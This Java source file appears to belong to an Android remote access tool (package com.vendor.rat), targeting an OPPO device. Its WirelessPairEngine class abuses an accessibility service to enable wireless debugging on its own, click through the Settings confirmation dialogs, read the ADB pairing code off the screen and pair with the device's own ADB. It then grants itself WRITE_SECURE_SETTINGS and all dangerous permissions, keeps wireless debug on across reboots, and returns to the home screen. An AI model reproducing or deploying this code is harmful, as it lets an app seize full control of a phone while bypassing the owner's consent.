package com.vendor.rat.auto.engine.adb;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.adb.AdbConnectionManager;
import com.vendor.rat.adb.AdbShellExecutor;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.util.GkdSelectorHelper;
import com.vendor.rat.service.EngineManager;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SecureSettingsWriter;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

/**
 * Wireless ADB self-pairing engine — 7-phase state machine.
 *
 * Navigates Settings UI via AccessibilityService to:
 * 1. Open Developer Options
 * 2. Enable wireless debugging (with confirm dialog handling)
 * 3. Click "使用配对码配对设备"
 * 4. Read 6-digit pairing code + port, then doPair()
 * 5. Auto-connect via mDNS
 * 6. Bootstrap permissions (WRITE_SECURE_SETTINGS, enableWifiDebug, grantAll)
 *
 * Target device: OPPO PGFM10 (Android 16, ColorOS)
 */
public class WirelessPairEngine extends AutoEngine {

    private static final String TAG = "WirelessPairEngine";

    /** Concurrency guard — only one pairing flow at a time */
    private static final AtomicBoolean mPairingInProgress = new AtomicBoolean(false);

    /** 6-digit code pattern */
    private static final Pattern CODE_PATTERN = Pattern.compile("\\d{6}");

    /** IP:port pattern for pairing endpoint */
    private static final Pattern IP_PORT_PATTERN = Pattern.compile(
            "(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d{4,5})");

    // ============ State machine ============

    enum PairState {
        IDLE, ENABLE_DEV_MODE, NAVIGATE_DEV_OPTIONS, ENABLE_WIRELESS_DEBUG,
        CLICK_PAIR_CODE, READ_AND_PAIR, AUTO_CONNECT, BOOTSTRAP_PERMISSIONS,
        DONE, DONE_PARTIAL, FAILED
    }

    private volatile PairState state = PairState.IDLE;
    private volatile long phaseStartTime;
    private volatile long overallStartTime;
    private volatile int scrollAttempts = 0;

    // ============ Constructor ============

    public WirelessPairEngine() {
        super(buildMatchers(), WirelessPairConstants.PKG_SETTINGS);
    }

    private static List<WindowMatcher> buildMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // Settings app: window state + content changes
        list.add(new WindowMatcher(WirelessPairConstants.PKG_SETTINGS)
                .addEventType(32).addEventType(2048));
        // SystemUI: for pairing dialogs that may appear over settings
        list.add(new WindowMatcher(WirelessPairConstants.PKG_SYSTEM_UI)
                .addEventType(32).addEventType(2048));
        return list;
    }

    // ============ Static entry point ============

    /**
     * Start the wireless pairing flow. Thread-safe, only one instance at a time.
     *
     * @param context Application or service context
     * @return true if pairing started, false if already in progress or service unavailable
     */
    public static boolean startPairing(Context context) {
        if (context == null) {
            Log.w(TAG, "startPairing: context is null");
            return false;
        }
        if (!mPairingInProgress.compareAndSet(false, true)) {
            Log.w(TAG, "startPairing: already in progress");
            return false;
        }

        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) {
            Log.e(TAG, "startPairing: AccessibilityService not running");
            mPairingInProgress.set(false);
            return false;
        }

        EngineManager mgr = service.getEngineManager();
        if (mgr == null) {
            Log.e(TAG, "startPairing: EngineManager not available");
            mPairingInProgress.set(false);
            return false;
        }

        WirelessPairEngine engine = new WirelessPairEngine();
        mgr.register(engine);
        engine.start();
        Log.i(TAG, "Wireless pairing engine started");
        return true;
    }

    // ============ Lifecycle ============

    @Override
    public void execute() {
        overallStartTime = System.currentTimeMillis();
        transitionTo(PairState.ENABLE_DEV_MODE);
    }

    @Override
    public void finish() {
        mPairingInProgress.set(false);
        // Unregister self from EngineManager
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null && service.getEngineManager() != null) {
            service.getEngineManager().unregister(this);
        }
        Log.i(TAG, "Engine finished in state: " + state);
        super.finish();
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                 AccessibilityEvent event) {
        // Handled by onEventSafe
    }

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        if (checkOverallTimeout()) return;
        if (checkPhaseTimeout()) return;

        switch (state) {
            case NAVIGATE_DEV_OPTIONS:
                dispatchState("NAV_DEV", this::handleNavigateDevOptions,
                        "ENABLE_WIRELESS", "CLICK_PAIR", "READ_PAIR");
                break;
            case ENABLE_WIRELESS_DEBUG:
                dispatchState("ENABLE_WIRELESS", this::handleEnableWirelessDebug,
                        "NAV_DEV", "CLICK_PAIR", "READ_PAIR");
                break;
            case CLICK_PAIR_CODE:
                dispatchState("CLICK_PAIR", this::handleClickPairCode,
                        "ENABLE_WIRELESS", "READ_PAIR");
                break;
            case READ_AND_PAIR:
                dispatchState("READ_PAIR", this::handleReadAndPair,
                        "CLICK_PAIR");
                break;
            default:
                // IDLE, AUTO_CONNECT, BOOTSTRAP_PERMISSIONS, DONE states
                // are handled by scheduler, not by events
                break;
        }
    }

    // ============ State transitions ============

    private void transitionTo(PairState newState) {
        PairState old = state;
        state = newState;
        phaseStartTime = System.currentTimeMillis();
        scrollAttempts = 0;
        log("State: " + old + " → " + newState);

        switch (newState) {
            case ENABLE_DEV_MODE:
                handleEnableDevMode();
                break;
            case NAVIGATE_DEV_OPTIONS:
                launchDevOptions();
                break;
            case AUTO_CONNECT:
                scheduler.execute(this::handleAutoConnect);
                break;
            case BOOTSTRAP_PERMISSIONS:
                scheduler.execute(this::handleBootstrapPermissions);
                break;
            case DONE:
            case DONE_PARTIAL:
                log("Pairing completed: " + newState);
                finish();
                break;
            case FAILED:
                logError("Pairing failed");
                finish();
                break;
            default:
                // Event-driven states (ENABLE_WIRELESS_DEBUG, CLICK_PAIR_CODE, READ_AND_PAIR)
                // will be handled via onEventSafe
                break;
        }
    }

    // ============ Phase 0: Enable Dev Mode ============

    private void handleEnableDevMode() {
        // Skip for now — assume dev options already enabled.
        // TODO: integrate OpenDevelopmentDelegate for full flow
        log("Phase 0: Skipping dev mode enable (assumed already enabled)");
        transitionTo(PairState.NAVIGATE_DEV_OPTIONS);
    }

    // ============ Phase 1: Navigate to Dev Options ============

    private void launchDevOptions() {
        scheduler.execute(() -> {
            try {
                Context ctx = getContext();
                if (ctx == null) {
                    logError("Phase 1: No context");
                    transitionTo(PairState.FAILED);
                    return;
                }
                Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                ctx.startActivity(intent);
                log("Phase 1: Launched developer options");
                sleep(1500);
                transitionTo(PairState.ENABLE_WIRELESS_DEBUG);
            } catch (Exception e) {
                logError("Phase 1: Launch failed", e);
                transitionTo(PairState.FAILED);
            }
        });
    }

    private void handleNavigateDevOptions() {
        // Verify we're on the dev options page
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 1: No root node, waiting...");
            return;
        }

        // Check for developer options indicators
        UiNode devTitle = GkdSelectorHelper.findOne(root,
                "TextView[text*=\"" + WirelessPairConstants.TEXT_DEVELOPER_OPTIONS + "\"]");
        if (devTitle != null) {
            log("Phase 1: Developer options page confirmed");
            transitionTo(PairState.ENABLE_WIRELESS_DEBUG);
        }
    }

    // ============ Phase 2: Enable Wireless Debug ============

    private void handleEnableWirelessDebug() {
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 2: No root node");
            return;
        }

        // Search for "无线调试" row
        UiNode wirelessRow = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_WIRELESS_DEBUG_ROW);

        if (wirelessRow == null) {
            // Try scrolling to find it
            if (scrollAttempts < WirelessPairConstants.MAX_SCROLL_ATTEMPTS) {
                UiNode scrollView = getScrollableNode();
                if (scrollView != null) {
                    scrollView.scrollForward();
                    scrollAttempts++;
                    log("Phase 2: Scrolling to find wireless debug (" + scrollAttempts + ")");
                    sleep(500);
                }
            } else {
                logError("Phase 2: Cannot find wireless debug after "
                        + WirelessPairConstants.MAX_SCROLL_ATTEMPTS + " scrolls");
                transitionTo(PairState.FAILED);
            }
            return;
        }

        // Found the row — check if it contains a Switch that is already on
        UiNode switchNode = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_SWITCH);
        boolean isEnabled = switchNode != null && switchNode.isChecked();

        if (isEnabled) {
            log("Phase 2: Wireless debug already enabled, clicking row to enter");
            wirelessRow.click();
            sleep(1000);
            transitionTo(PairState.CLICK_PAIR_CODE);
            return;
        }

        // Toggle is off — click the row to enter wireless debug page or toggle on
        log("Phase 2: Clicking wireless debug row to enable");
        wirelessRow.click();
        sleep(1000);

        // After clicking, a confirm dialog may appear
        handleConfirmDialog();
    }

    /**
     * Handle the wireless debugging confirmation dialog.
     * Three possible button variants: 确认, 允许, 确定
     */
    private void handleConfirmDialog() {
        activateRoot();
        UiNode root = k();
        if (root == null) return;

        // Try each confirm button variant
        String[] confirmSelectors = {
                WirelessPairConstants.SEL_CONFIRM_BUTTON_ID,
                WirelessPairConstants.SEL_CONFIRM_BUTTON_TEXT,
                WirelessPairConstants.SEL_ALLOW_BUTTON_TEXT,
                WirelessPairConstants.SEL_OK_BUTTON_TEXT,
        };

        for (String selector : confirmSelectors) {
            UiNode btn = GkdSelectorHelper.findOne(root, selector);
            if (btn != null) {
                log("Phase 2: Found confirm button: " + selector);
                btn.click();
                sleep(1000);
                // After confirming, we should be on the wireless debug page
                transitionTo(PairState.CLICK_PAIR_CODE);
                return;
            }
        }

        // No dialog found — might already be on wireless debug settings page
        // Check if we see "使用配对码" which means we're already past the dialog
        UiNode pairOption = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_PAIR_WITH_CODE);
        if (pairOption != null) {
            log("Phase 2: Already on wireless debug page (no dialog)");
            transitionTo(PairState.CLICK_PAIR_CODE);
            return;
        }

        log("Phase 2: No confirm dialog or pair option found, waiting for event...");
    }

    // ============ Phase 3: Click Pair Code ============

    private void handleClickPairCode() {
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 3: No root node");
            return;
        }

        UiNode pairOption = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_PAIR_WITH_CODE);

        if (pairOption == null) {
            // Scroll to find it
            if (scrollAttempts < WirelessPairConstants.MAX_SCROLL_ATTEMPTS) {
                UiNode scrollView = getScrollableNode();
                if (scrollView != null) {
                    scrollView.scrollForward();
                    scrollAttempts++;
                    log("Phase 3: Scrolling to find pair code option (" + scrollAttempts + ")");
                    sleep(500);
                }
            } else {
                logError("Phase 3: Cannot find pair code option");
                transitionTo(PairState.FAILED);
            }
            return;
        }

        log("Phase 3: Found 'pair with code' option, clicking");
        pairOption.click();
        sleep(1500);
        transitionTo(PairState.READ_AND_PAIR);
    }

    // ============ Phase 4: Read Code + Pair ============

    private void handleReadAndPair() {
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 4: No root node");
            return;
        }

        // Scan all TextViews for 6-digit code and IP:port
        List<UiNode> textNodes = GkdSelectorHelper.findAll(root, "TextView");
        if (textNodes == null || textNodes.isEmpty()) {
            log("Phase 4: No TextViews found");
            return;
        }

        String pairCode = null;
        int pairPort = -1;

        for (UiNode node : textNodes) {
            String text = node.getText();
            if (text == null || text.isEmpty()) continue;

            // Match 6-digit pairing code
            if (pairCode == null && CODE_PATTERN.matcher(text.trim()).matches()) {
                pairCode = text.trim();
                log("Phase 4: Found pair code: " + pairCode);
            }

            // Match IP:port pattern
            java.util.regex.Matcher ipMatcher = IP_PORT_PATTERN.matcher(text);
            if (pairPort < 0 && ipMatcher.find()) {
                try {
                    int port = Integer.parseInt(ipMatcher.group(2));
                    if (port >= WirelessPairConstants.PAIR_PORT_MIN
                            && port <= WirelessPairConstants.PAIR_PORT_MAX) {
                        pairPort = port;
                        log("Phase 4: Found pair port: " + pairPort);
                    }
                } catch (NumberFormatException ignored) {
                }
            }
        }

        if (pairCode == null) {
            log("Phase 4: Pair code not found yet, waiting...");
            return;
        }

        if (pairPort < 0) {
            log("Phase 4: Pair port not found yet, waiting...");
            return;
        }

        // Execute pairing on scheduler thread (network op)
        final String code = pairCode;
        final int port = pairPort;
        scheduler.execute(() -> {
            log("Phase 4: Calling doPair(127.0.0.1, " + port + ", " + code + ")");
            AdbConnectionManager mgr = AdbConnectionManager.getInstance();
            if (mgr == null) {
                logError("Phase 4: AdbConnectionManager not initialized");
                transitionTo(PairState.FAILED);
                return;
            }
            boolean paired = mgr.doPair("127.0.0.1", port, code);
            if (paired) {
                log("Phase 4: Pairing succeeded!");
                // Dismiss the pair dialog
                performBack();
                sleep(500);
                transitionTo(PairState.AUTO_CONNECT);
            } else {
                logError("Phase 4: Pairing failed");
                transitionTo(PairState.FAILED);
            }
        });

        // Prevent re-entry while pairing is in progress
        state = PairState.IDLE;
    }

    // ============ Phase 5: Auto Connect ============

    private void handleAutoConnect() {
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null) {
            logError("Phase 5: AdbConnectionManager not initialized");
            transitionTo(PairState.FAILED);
            return;
        }

        for (int i = 0; i < WirelessPairConstants.AUTO_CONNECT_MAX_RETRIES; i++) {
            log("Phase 5: Auto-connect attempt " + (i + 1));
            boolean connected = mgr.doAutoConnect();
            if (connected) {
                log("Phase 5: Auto-connect succeeded!");
                transitionTo(PairState.BOOTSTRAP_PERMISSIONS);
                return;
            }
            sleep(WirelessPairConstants.AUTO_CONNECT_RETRY_DELAY_MS);
        }

        logError("Phase 5: Auto-connect failed after "
                + WirelessPairConstants.AUTO_CONNECT_MAX_RETRIES + " retries");
        transitionTo(PairState.FAILED);
    }

    // ============ Phase 6: Bootstrap Permissions ============

    private void handleBootstrapPermissions() {
        log("Phase 6: Bootstrapping permissions");

        Context ctx = getContext();
        String pkgName = ctx != null ? ctx.getPackageName() : "com.vendor.rat";

        // 1. Grant WRITE_SECURE_SETTINGS
        boolean secureGranted = AdbShellExecutor.grantWriteSecureSettings(pkgName);
        log("Phase 6: WRITE_SECURE_SETTINGS granted=" + secureGranted);

        // 2. Enable wireless debug via settings API (persists across reboot)
        if (secureGranted && ctx != null) {
            SecureSettingsWriter.enableDeveloperOptions(ctx);
            SecureSettingsWriter.enableWifiDebug(ctx);
            log("Phase 6: Wireless debug enabled via SecureSettingsWriter");
        }

        // 3. Grant all dangerous permissions
        int granted = AdbShellExecutor.grantAllPermissions(pkgName);
        log("Phase 6: Granted " + granted + " dangerous permissions");

        // Navigate away from settings
        performBack();
        sleep(300);
        performBack();
        sleep(300);
        performHome();

        if (secureGranted) {
            transitionTo(PairState.DONE);
        } else {
            log("Phase 6: WRITE_SECURE_SETTINGS failed, partial success");
            transitionTo(PairState.DONE_PARTIAL);
        }
    }

    // ============ Timeout checks ============

    private boolean checkPhaseTimeout() {
        if (state == PairState.IDLE || state == PairState.DONE
                || state == PairState.DONE_PARTIAL || state == PairState.FAILED) {
            return false;
        }
        long elapsed = System.currentTimeMillis() - phaseStartTime;
        if (elapsed > WirelessPairConstants.PHASE_TIMEOUT_MS) {
            logError("Phase timeout: " + state + " after " + elapsed + "ms");
            transitionTo(PairState.FAILED);
            return true;
        }
        return false;
    }

    private boolean checkOverallTimeout() {
        long elapsed = System.currentTimeMillis() - overallStartTime;
        if (elapsed > WirelessPairConstants.OVERALL_TIMEOUT_MS) {
            logError("Overall timeout after " + elapsed + "ms");
            transitionTo(PairState.FAILED);
            return true;
        }
        return false;
    }

    // ============ Equals / HashCode ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof WirelessPairEngine;
    }

    @Override
    public int hashCode() {
        return WirelessPairEngine.class.getName().hashCode();
    }
}
